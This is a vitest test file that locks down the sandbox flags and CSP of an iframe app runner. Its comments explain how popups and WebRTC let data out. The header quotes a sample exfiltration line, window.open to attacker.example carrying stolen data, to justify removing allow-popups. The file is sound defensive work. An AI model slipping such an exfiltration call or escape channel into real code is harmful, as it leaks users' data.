/**
 * The app's egress surface, pinned.
 *
 * `default-src 'none'` is what people point at when they say an app cannot reach the network, and
 * it does stop fetch, XHR, WebSocket and image beacons. It does NOT stop navigation: CSP's fetch
 * directives do not govern it, and `navigate-to` never shipped in any browser. So while the iframe
 * held `allow-popups`, an app could call
 *
 *     window.open("https://attacker.example/?d=" + stolen)
 *
 * synchronously inside any click it already receives, then close the window. Verified against the
 * real assembled document: with `allow-popups` the request arrives at the listening server with the
 * data in the query string; without it, nothing arrives. The two constants below are the whole of
 * that fix, which is why they are asserted literally rather than by shape.
 *
 * If a future app needs to link somewhere external, route it through the host's `nav` message —
 * where the person can see the destination — and do not restore the flag.
 */

import {describe, expect, it} from "vitest"

import {BRIDGE_STUB} from "../../src/drive/htmlApp/stub"
import {RUN_CSP, SANDBOX_FLAGS} from "../../src/drive/htmlApp/protocol"

describe("run sandbox flags", () => {
    it("is exactly scripts and forms", () => {
        expect(SANDBOX_FLAGS).toBe("allow-scripts allow-forms")
    })

    it("never grants popups — the app's last way out", () => {
        expect(SANDBOX_FLAGS).not.toContain("allow-popups")
    })

    it("never grants same-origin — the app must stay a foreign origin", () => {
        expect(SANDBOX_FLAGS).not.toContain("allow-same-origin")
    })
})

describe("run CSP", () => {
    it("denies everything by default", () => {
        expect(RUN_CSP).toContain("default-src 'none'")
    })

    it("names form-action, which does not inherit from default-src", () => {
        expect(RUN_CSP).toContain("form-action 'none'")
    })

    // Open on purpose: an app may load libraries, fonts and images from a CDN and call APIs.
    // See RUN_CSP for why egress is not the boundary. Plain http and wildcards stay out.
    it("allows https for scripts, styles, fonts, images and fetch, and nothing looser", () => {
        for (const directive of ["script-src", "style-src", "img-src", "font-src", "connect-src"]) {
            expect(RUN_CSP).toMatch(new RegExp(`${directive} [^;]*https:`))
        }
        expect(RUN_CSP).not.toContain("http:")
        expect(RUN_CSP).not.toContain("*")
    })

    it("keeps inline script and style, which the assembler depends on", () => {
        expect(RUN_CSP).toContain("script-src 'unsafe-inline'")
        expect(RUN_CSP).toContain("style-src 'unsafe-inline'")
    })
})

describe("WebRTC", () => {
    // The one network API the CSP does not reach: ICE is not a fetch, so `default-src 'none'`
    // does not apply. Measured open against this exact sandbox and policy — a peer connection
    // reached a public STUN server — and `webrtc 'block'` in a <meta> policy did not close it.
    // The stub runs before app code, so the constructors go before the app can hold one.
    it("removes every peer-connection constructor in the stub", () => {
        for (const name of [
            "RTCPeerConnection",
            "webkitRTCPeerConnection",
            "mozRTCPeerConnection",
            "RTCDataChannel",
        ]) {
            expect(BRIDGE_STUB).toContain(name)
        }
    })

    it("removes them before anything else runs", () => {
        const removal = BRIDGE_STUB.indexOf("RTCPeerConnection")
        const firstListener = BRIDGE_STUB.indexOf("addEventListener")
        expect(removal).toBeGreaterThan(-1)
        expect(removal).toBeLessThan(firstListener)
    })
})
